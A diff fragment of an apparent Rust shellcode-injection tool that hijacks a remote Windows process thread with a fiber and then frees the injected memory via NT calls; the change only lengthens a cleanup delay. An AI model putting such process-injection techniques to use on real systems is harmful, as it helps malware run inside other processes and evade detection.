@@ -293,7 +293,7 @@ fn main() -> Result<()> {
                                      Ok((addr, _size)) => {
                                          // println!("[+] Success!");
                                          if use_cleanup {
-                                             thread::sleep(Duration::from_millis(500));
+                                             thread::sleep(Duration::from_millis(5000));
                                              let mut region_size: usize = 0;
                                              let mut base_addr = addr;
                                              missed_calls::nt_free_virtual_memory(
@@ -364,9 +364,9 @@ fn main() -> Result<()> {
 
                     match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
                         Ok((addr, _size)) => {
-                            if use_cleanup {
-                                 thread::sleep(Duration::from_millis(500));
-                                 let mut region_size: usize = 0;
+                                 if use_cleanup {
+                                     thread::sleep(Duration::from_millis(5000));
+                                     let mut region_size: usize = 0;
                                  let mut base_addr = addr;
                                  missed_calls::nt_free_virtual_memory(
                                     h_process.0 as *mut winapi::ctypes::c_void,
